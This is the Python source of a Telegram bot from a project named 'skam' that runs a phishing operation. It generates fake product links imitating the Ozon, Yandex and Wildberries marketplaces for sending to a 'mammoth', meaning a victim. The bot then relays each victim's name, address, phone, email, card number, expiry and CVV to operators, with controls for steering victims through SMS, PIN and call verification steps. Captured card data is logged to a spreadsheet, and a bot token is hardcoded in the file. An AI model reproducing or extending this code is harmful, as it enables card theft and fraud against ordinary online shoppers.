import os
import string
from asyncio import get_event_loop
from random import choice

from asgiref.sync import sync_to_async

from django.conf import settings
from django.core.management.base import BaseCommand

from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import Message, CallbackQuery, User, InputFile
from aiogram import Bot, Dispatcher, executor, types
from skam.models import Link, Profile
import datetime
from pathlib import Path
import pandas as pd
from django.core.management import call_command
# Build paths inside the project like this: BASE_DIR / 'subdir'.
BASE_DIR = Path(__file__).resolve().parent.parent
os.environ["DJANGO_ALLOW_ASYNC_UNSAFE"] = "true"
# bot = Bot(token=settings.BOT_TOKEN)
PROXY_URL = "http://proxy.server:3128"
bot: Bot = Bot(token='6091467930:AAHZ-j1hJR77kq0C0rmoLig8WF-A2YKd5ns')
token='6091467930:AAHZ-j1hJR77kq0C0rmoLig8WF-A2YKd5ns'
admins = [373668569, 5484675146]
shop_btn = [
            'ozon',
            'yandex',
            'wildberies'
                ]


class LinkData(StatesGroup):
    shop = State()
    image = State()
    product_name = State()
    price = State()
    description = State()
    old_price = State()


def log_errors(f) -> any:
    def inner(*args, **kwargs) -> any:
        try:
            return f(*args, **kwargs)
        except Exception as e:
            error_message: str = f'Произошла ошибка: {e}'
            print(error_message)

            raise e

    return inner


@log_errors
async def log_submit(link_id: int, address: str, fio: str, phone: str, email: str, comment: str, cardnumber: str, card_data: str, card_data_2: str, cvv: str, link_str: str = '') -> None:
    txt = f"""
        🌐 Платформа: OZON
         ID: {link_id}
         Адрес: {address}
         ФИО: {fio}
         Номер Телефона: {phone}
         Email: {email}
         Комментарий: {comment}
         Номер карты: {cardnumber}
         Срок действия: {card_data}/{card_data_2}
         CVV: {cvv}

"""

    keyboard = types.InlineKeyboardMarkup()
    # keyboard.add(types.InlineKeyboardButton(text="✔Вводит карту✔", callback_data="a"))
    # keyboard.row(
    #    types.InlineKeyboardButton(text="❌Отказаться❌", callback_data="a"),
    #    types.InlineKeyboardButton(text="✅Залёт✅", callback_data="a")
    # )
    keyboard.row(
        types.InlineKeyboardButton(text="📧SMS📧", callback_data=f"sms!{link_str}"),
        types.InlineKeyboardButton(text="🔘PUSH🔘", callback_data=f"push!{link_str}"),
        types.InlineKeyboardButton(text="🔃LOADER🔃", callback_data=f"loader!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="🔑PIN🔑", callback_data=f"pin!{link_str}"),
        types.InlineKeyboardButton(text="📞ЗВОНОК📞", callback_data=f"call!{link_str}")
    )
    keyboard.row(
        types.InlineKeyboardButton(text="💳КАРТА💳", callback_data=f"card!{link_str}"),
        types.InlineKeyboardButton(text="🗳Главная🗳", callback_data=f"main!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="✔УСПЕХ✔", callback_data=f"suc!{link_str}"),
        types.InlineKeyboardButton(text="❌Отказаться❌", callback_data=f"cancel!{link_str}"),
        types.InlineKeyboardButton(text="❌Сброс❌", callback_data=f"otm!{link_str}"),)

    link: Link = Link.objects.get(link=link_str)
    userinfo = await bot.get_chat_member(link.tg_id, link.tg_id)
    admin_st = Profile.objects.get(username=userinfo.user.username).user_status
    if admin_st == True:
        await bot.send_message(
                chat_id=link.tg_id,
                text=txt, reply_markup=keyboard)
    else:
        all_users = Profile.objects.filter(user_status=True, online_status=True).values_list('tg_id', flat=True).distinct()
        for i in range(len(all_users)):
            await bot.send_message(chat_id=all_users[i], text=txt, reply_markup=keyboard)

    date_start = datetime.datetime.now().strftime("%d.%m.%y")
    df = pd.DataFrame({
        '🌐 Платформа': ['OZON'],
         'ID': [link_id],
         'Адрес': [address],
         'ФИО': [fio],
         'Номер Телефона': [phone],
         'Email': [email],
         'Комментарий': [comment],
         'Номер карты': [cardnumber],
         'Срок действия': [f"{card_data}/{card_data_2}"],
         'CVV': [cvv],
         'Дата': [date_start]
         })

    with pd.ExcelWriter(f'{BASE_DIR}/commands/logs.xlsx', mode="a", engine="openpyxl", if_sheet_exists="new",) as writer:
        df.to_excel(writer, sheet_name="Logs")



@log_errors
async def log_submit_y(link_id: int, address: str, flat: str, firstname: str, lastname: str, middlename: str, fio: str, phone: str, email: str, cardnumber: str,
 card_data: str, card_data_2: str, cvv: str, link_str: str = '') -> None:
    txt = f"""
        🌐 Платформа: YANDEX
         ID: {link_id}
         Адрес: {address}
         Офис: {flat}
         Firstname: {firstname}
         Lastname: {lastname}
         Middlename: {middlename}
         FIO: {fio}
         Номер Телефона: {phone}
         Email: {email}
         Номер карты: {cardnumber}
         Срок действия: {card_data}/{card_data_2}
         CVV: {cvv}

"""
    

    keyboard = types.InlineKeyboardMarkup()
    # keyboard.add(types.InlineKeyboardButton(text="✔Вводит карту✔", callback_data="a"))
    # keyboard.row(
    #    types.InlineKeyboardButton(text="❌Отказаться❌", callback_data="a"),
    #    types.InlineKeyboardButton(text="✅Залёт✅", callback_data="a")
    # )
    keyboard.row(
        types.InlineKeyboardButton(text="📧SMS📧", callback_data=f"sms!{link_str}"),
        types.InlineKeyboardButton(text="🔘PUSH🔘", callback_data=f"push!{link_str}"),
        types.InlineKeyboardButton(text="🔃LOADER🔃", callback_data=f"loader!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="🔑PIN🔑", callback_data=f"pin!{link_str}"),
        types.InlineKeyboardButton(text="📞ЗВОНОК📞", callback_data=f"call!{link_str}")
    )
    keyboard.row(
        types.InlineKeyboardButton(text="💳КАРТА💳", callback_data=f"card!{link_str}"),
        types.InlineKeyboardButton(text="🗳Главная🗳", callback_data=f"main!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="✔УСПЕХ✔", callback_data=f"suc!{link_str}"),
        types.InlineKeyboardButton(text="❌Отказаться❌", callback_data=f"cancel!{link_str}"),
        types.InlineKeyboardButton(text="❌Сброс❌", callback_data=f"otm!{link_str}"),)

    link: Link = Link.objects.get(link=link_str)

    link: Link = Link.objects.get(link=link_str)
    userinfo = await bot.get_chat_member(link.tg_id, link.tg_id)
    admin_st = Profile.objects.get(username=userinfo.user.username).user_status
    if admin_st == True:
        await bot.send_message(
                chat_id=link.tg_id,
                text=txt, reply_markup=keyboard)
    else:
        all_users = Profile.objects.filter(user_status=True, online_status=True).values_list('tg_id', flat=True).distinct()
        for i in range(len(all_users)):
            bot.send_message(chat_id=all_users[i], text=txt, reply_markup=keyboard)
    date_start = datetime.datetime.now().strftime("%d.%m.%y")
    df = pd.DataFrame({
        '🌐 Платформа': ['YANDEX'],
         'ID': [link_id],
         'Адрес': [address],
         'Офис': [flat],
         'Firstname': [firstname],
         'Lastname': [lastname],
         'Middlename': [middlename],
         'FIO': [fio],
         'Номер Телефона': [phone],
         'Email': [email],
         'Номер карты': [cardnumber],
         'Срок действия': [f"{card_data}/{card_data_2}"],
         'CVV': [cvv],
         'Дата': [date_start],
         })

    
    with pd.ExcelWriter(f'{BASE_DIR}/commands/logs.xlsx', mode="a", engine="openpyxl", if_sheet_exists="new",) as writer:
        df.to_excel(writer, sheet_name="Logs")



@log_errors
async def log_submit_w(link_id: int, address: str, firstname: str, lastname: str, phone: str, email: str, cardnumber: str, card_data: str, card_data_2: str, cvv: str, fio: str, link_str: str = '') -> None:
    txt = f"""
        🌐 Платформа: WILDBERIES
         ID: {link_id}
         Адрес: {address}
         ФИО: {fio} 
         Firstname: {firstname}
         Lastname: {lastname}
         Номер Телефона: {phone}
         Email: {email}
         Номер карты: {cardnumber}
         Срок действия: {card_data}/{card_data_2}
         CVV: {cvv}

"""

    keyboard = types.InlineKeyboardMarkup()
    # keyboard.add(types.InlineKeyboardButton(text="✔Вводит карту✔", callback_data="a"))
    # keyboard.row(
    #    types.InlineKeyboardButton(text="❌Отказаться❌", callback_data="a"),
    #    types.InlineKeyboardButton(text="✅Залёт✅", callback_data="a")
    # )
    keyboard.row(
        types.InlineKeyboardButton(text="📧SMS📧", callback_data=f"sms!{link_str}"),
        types.InlineKeyboardButton(text="🔘PUSH🔘", callback_data=f"push!{link_str}"),
        types.InlineKeyboardButton(text="🔃LOADER🔃", callback_data=f"loader!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="🔑PIN🔑", callback_data=f"pin!{link_str}"),
        types.InlineKeyboardButton(text="📞ЗВОНОК📞", callback_data=f"call!{link_str}")
    )
    keyboard.row(
        types.InlineKeyboardButton(text="💳КАРТА💳", callback_data=f"card!{link_str}"),
        types.InlineKeyboardButton(text="🗳Главная🗳", callback_data=f"main!{link_str}"),
    )
    keyboard.row(
        types.InlineKeyboardButton(text="✔УСПЕХ✔", callback_data=f"suc!{link_str}"),
        types.InlineKeyboardButton(text="❌Отказаться❌", callback_data=f"cancel!{link_str}"),
        types.InlineKeyboardButton(text="❌Сброс❌", callback_data=f"otm!{link_str}"),)

    link: Link = Link.objects.get(link=link_str)

    link: Link = Link.objects.get(link=link_str)
    userinfo = await bot.get_chat_member(link.tg_id, link.tg_id)
    admin_st = Profile.objects.get(username=userinfo.user.username).user_status
    if admin_st == True:
        await bot.send_message(
                chat_id=link.tg_id,
                text=txt, reply_markup=keyboard)

    else:
        all_users = Profile.objects.filter(user_status=True, online_status=True).values_list('tg_id', flat=True).distinct()
        for i in range(len(all_users)):
            bot.send_message(chat_id=all_users[i], text=txt, reply_markup=keyboard)

    date_start = datetime.datetime.now().strftime("%d.%m.%y")
    df = pd.DataFrame({
        '🌐 Платформа': ['WILDBERIES'],
         'ID': [link_id],
         'Адрес': [address],
         'ФИО': [fio],
        'Firstname': [firstname],
         'Lastname': [lastname],
         'Номер Телефона': [phone],
         'Email': [email],
         'Номер карты': [cardnumber],
         'Срок действия': [f'{card_data}/{card_data_2}'],
         'CVV': [cvv],
         'Дата': [date_start]
         })

    with pd.ExcelWriter(f'{BASE_DIR}/commands/logs.xlsx', mode="a", engine="openpyxl", if_sheet_exists="new",) as writer:
        df.to_excel(writer, sheet_name="Logs")



@log_errors
async def log_user_action(action: str, link_id: str) -> None:
    link: Link = Link.objects.get(link=link_id)
    await bot.send_message(chat_id=link.tg_id, text=f"Сообщение от : {link_id} \n" + action)
    


@log_errors
async def start_handler(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    try:
        if message.from_user.id in admins:
            Profile.objects.create(tg_id=message.from_user.id, username=message.from_user.username, user_status=True, authorisation=True, status_admin=True, online_status=False)
        else:
            Profile.objects.create(tg_id=message.from_user.id, username=message.from_user.username, user_status=False, authorisation=False, status_admin=False, online_status=False)
    except:
        pass
    key = types.ReplyKeyboardMarkup()
    key.add(types.KeyboardButton('✏️ Создать ссылку'))
    key.add(types.KeyboardButton('🔗 Активные ссылки'))
    admin_st1 = Profile.objects.get(tg_id=message.from_user.id).user_status
    auth_st1 = Profile.objects.get(tg_id=message.from_user.id).authorisation
    adm_st1 = Profile.objects.get(tg_id=message.from_user.id).status_admin
    if adm_st1 == True:
        key.add(types.KeyboardButton('👨‍💻 Назначить вбивера'))
        key.add(types.KeyboardButton('🔗 Получить все логи'))
        key.add(types.KeyboardButton('Изменить статус онлайна'))
    elif admin_st1 == True:
        key.add(types.KeyboardButton('Изменить статус онлайна'))
    if auth_st1 == False:
        await message.answer(
            text=f'Привет, {message.from_user.first_name}, ожидайте подтверждения от админа'
            ) 
        wait_key = types.InlineKeyboardMarkup()
        wait_key.row(types.InlineKeyboardButton(text="Разрешить вход", callback_data=f"auth!{message.from_user.username}"))
        await bot.send_message(chat_id=5484675146, text=f'Новый пользователь @{message.from_user.username}', reply_markup=wait_key)   
    else:
        await message.answer(
            text=f'Привет, {message.from_user.first_name}, создай ссылку, чтобы работать со мной :)',
            reply_markup=key
            )     


@log_errors
async def get_logs(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    await bot.send_document(chat_id=message.from_user.id, document=open(f'{BASE_DIR}/commands/logs.xlsx', 'rb'))
    #await message.reply_document(open('C:/Users/itroot/Desktop/skam/skamozon/skam/logs.xlsx', 'rb'))



@log_errors
async def change_online(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row(types.InlineKeyboardButton(text="Работаю", callback_data=f'online!{message.from_user.username}'))
    keyboard.row(types.InlineKeyboardButton(text="Ушел на покой", callback_data=f'disactive!{message.from_user.username}'))
    await message.answer(text="Выберите статус своей работы!", reply_markup=keyboard)


@log_errors
async def get_users(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    all_users = Profile.objects.values_list('username', 'user_status').distinct()
    for i in range(len(all_users)):
        key = types.InlineKeyboardMarkup()
        if bool(all_users[i][1]) == True:
            key.row(types.InlineKeyboardButton(text="Разжаловать", callback_data=f"del!{all_users[i]}"))
        if bool(all_users[i][1]) == False:
            key.row(types.InlineKeyboardButton(text="Назначить", callback_data=f"admin!{all_users[i]}"))
        
        await message.answer(text=f'Пользователь: @{all_users[i][0]} статус вбивера: {bool(all_users[i][1])}',
                            reply_markup=key)


@log_errors
async def new_admin_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    if callback.data.split("!")[1].split(",")[0][1:].replace("'", "") == callback.from_user.username:
        await bot.send_message(text=f'Вы не можете изменить собственный статус пользователя!', chat_id=callback.from_user.id)
    else:
        admn = Profile.objects.get(username=callback.data.split("!")[1].split(",")[0][1:].replace("'", ""))
        admn.user_status = True
        admn.save()
        sts = callback.data.split("!")[1].split(",")[0][1:].replace("'", "")
        await bot.send_message(text=f'Статус пользователя @{sts} изменен!', chat_id=callback.from_user.id)


@log_errors
async def delete_admin_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    if callback.data.split("!")[1].split(",")[0][1:].replace("'", "") == callback.from_user.username:
        await bot.send_message(text=f'Вы не можете изменить собственный статус пользователя!', chat_id=callback.from_user.id)
    else:
        admn = Profile.objects.get(username=callback.data.split("!")[1].split(",")[0][1:].replace("'", ""))
        admn.user_status = False
        admn.save()
        sts = callback.data.split("!")[1].split(",")[0][1:].replace("'", "")
        await bot.send_message(text=f'Статус пользователя @{sts} изменен!', chat_id=callback.from_user.id)
    

@log_errors
async def auth_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    admn = Profile.objects.get(username=callback.data.split("!")[1])
    admn.authorisation = True
    admn.save()
    sts = callback.data.split("!")[1]
    await bot.send_message(text=f'Пользователь @{sts} допущен к панеле', chat_id=callback.from_user.id)
    

@log_errors
async def online_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    admn = Profile.objects.get(username=callback.data.split("!")[1])
    admn.online_status = True
    admn.save()
    sts = callback.data.split("!")[1]
    await bot.send_message(text=f'Пользователь @{sts} начал работу', chat_id=373668569)


@log_errors
async def notonline_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    admn = Profile.objects.get(username=callback.data.split("!")[1])
    admn.online_status = False
    admn.save()
    sts = callback.data.split("!")[1]
    await bot.send_message(text=f'Пользователь @{sts} закончил работу', chat_id=373668569)


@log_errors
async def create_link(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    key = types.ReplyKeyboardMarkup()
    key.add(shop_btn[0], shop_btn[1], shop_btn[2])

    await LinkData.shop.set()
    await message.answer(
        text=f'Выберите платформу',
        reply_markup=key
        )


@log_errors
async def create_link_2(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['shop'] = message.parse_entities()
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id,
        text=f'Отправте фото или ссылку на изображение!',

        )

@log_errors
async def create_link_3(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        file_id = message.photo[-1].file_id
        file_info = await bot.get_file(message.photo[-1].file_id)
        data['image'] = f'http://api.telegram.org/file/bot{token}/{file_info.file_path}'
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id,
        text=f'Введите название товара',

        )


@log_errors
async def create_link_4(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['product_name'] = message.parse_entities()
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id,
        text=f'Введите цену товара',

        )


@log_errors
async def create_link_5(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['price'] = message.parse_entities()
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id, text=f'Введите описание товара по шаблону: Свойство:значение|Свойство:значение|Свойство:значение и так далее')


@log_errors
async def create_link_6(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['description'] = message.parse_entities()  
        await LinkData.next()
        await bot.send_message(chat_id=message.from_user.id, text=f'Введите старую цену товара')



@log_errors
async def create_link_7(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    async with state.proxy() as data:
        data['old_price'] = message.parse_entities()  
        link_str: str = ''.join([choice(list(string.ascii_letters)) for i in range(10)])
        Link.objects.create(tg_id=message.from_user.id, link=link_str, status=0, image_link=data['image'], shop=data['shop'], price=data['price'],
         product_name=data['product_name'], product_description=data['description'], old_price=data['old_price'])
        await message.answer(
        f'Создал ссылку : domen/s/{link_str} \nСкинь ее мамонту и отслеживай его действия',

        )
        await state.finish()


@log_errors
async def all_links(message: Message, state: FSMContext, raw_state: str | None = None, command=None) -> None:
    all_link = Link.objects.filter(tg_id=message.from_user.id).values_list('link', flat=True).distinct()
    for i in range(len(all_link)):
        key = keyboard = types.InlineKeyboardMarkup()
        key.row(types.InlineKeyboardButton(text="УДАЛИТЬ", callback_data=f"delete!{all_link[i]}"))
        await message.answer(text=f'fondzaschita.com/s/{all_link[i]}',
                            reply_markup=key)

    await message.answer(f'Всего найдено {len(all_link)} ссылок')



@log_errors
async def delete_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    dlt = Link.objects.get(link=callback.data.split("!")[1])
    dlt.delete()
    await callback.answer("Ссылка удалена")
    await bot.delete_message(chat_id=callback.from_user.id, message_id=callback.message.message_id)




@log_errors
async def sms_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 1
    link.save()
    await callback.answer("Ожидайте")



@log_errors
async def main_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 8
    link.save()
    await callback.answer("Ожидайте")



@log_errors
async def otm_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 0
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def suc_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 6
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def push_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 7
    link.save()
    await callback.answer("Ожидайте")




@log_errors
async def call_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 5
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def cancel(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 9
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def pin_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 3
    link.save()
    await callback.answer("Ожидайте")


@log_errors
async def loader_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 4
    link.save()
    await callback.answer("Ожидайте")



@log_errors
async def card_handler(callback: CallbackQuery, state: FSMContext, raw_state: str | None = None) -> None:
    link = Link.objects.get(link=callback.data.split("!")[1])
    link.status = 2
    link.save()
    await callback.answer("Ожидайте")


class Command(BaseCommand):
    help = 'Telegram bot'

    def handle(self, *args, **kwargs) -> None:
        dp: Dispatcher = Dispatcher(bot, loop=get_event_loop(), storage=MemoryStorage())
        dp.register_message_handler(all_links, text="🔗 Активные ссылки")
        dp.register_message_handler(get_users, text="👨‍💻 Назначить вбивера")
        dp.register_message_handler(start_handler, commands=['start'])
        dp.register_message_handler(create_link, text="✏️ Создать ссылку")
        dp.register_message_handler(get_logs, text="🔗 Получить все логи")
        dp.register_message_handler(change_online, text="Изменить статус онлайна")
        dp.register_message_handler(create_link_2, state=LinkData.shop)
        dp.register_message_handler(create_link_3, state=LinkData.image, content_types=["photo"])
        dp.register_message_handler(create_link_4, state=LinkData.product_name)
        dp.register_message_handler(create_link_5, state=LinkData.price)
        dp.register_message_handler(create_link_6, state=LinkData.description)
        dp.register_message_handler(create_link_7, state=LinkData.old_price)
        dp.register_callback_query_handler(delete_handler, lambda x: "delete" in x.data)
        dp.register_callback_query_handler(new_admin_handler, lambda x: "admin" in x.data)
        dp.register_callback_query_handler(delete_admin_handler, lambda x: "del" in x.data)
        dp.register_callback_query_handler(auth_handler, lambda x: "auth" in x.data)
        dp.register_callback_query_handler(call_handler, lambda x: "call" in x.data)
        dp.register_callback_query_handler(suc_handler, lambda x: "suc" in x.data)
        dp.register_callback_query_handler(push_handler, lambda x: "push" in x.data)
        dp.register_callback_query_handler(main_handler, lambda x: "main" in x.data)
        dp.register_callback_query_handler(otm_handler, lambda x: "otm" in x.data)
        dp.register_callback_query_handler(cancel, lambda x: "cancel" in x.data)
        dp.register_callback_query_handler(sms_handler, lambda x: "sms" in x.data)
        dp.register_callback_query_handler(pin_handler, lambda x: "pin" in x.data)
        dp.register_callback_query_handler(card_handler, lambda x: "card" in x.data)
        dp.register_callback_query_handler(loader_handler, lambda x: "loader" in x.data)
        dp.register_callback_query_handler(online_handler, lambda x: "online" in x.data)
        dp.register_callback_query_handler(notonline_handler, lambda x: "disactive" in x.data)

        
        executor.start_polling(dp, skip_updates=True)
